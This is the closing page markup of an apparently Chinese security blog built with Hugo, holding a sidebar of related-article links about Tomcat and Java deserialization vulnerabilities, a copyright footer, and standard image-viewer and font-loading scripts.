    <a href="/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
        
        

        <div class="article-details">
            <h2 class="article-title">Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/">
        
        

        <div class="article-details">
            <h2 class="article-title">Tomcat关键知识了解</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
        
        

        <div class="article-details">
            <h2 class="article-title">hibernate组件的反序列化漏洞</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/">
        
        

        <div class="article-details">
            <h2 class="article-title">JDK17下的反射绕过</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 Example Person
    </section>
    
    <section class="powerby">
        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
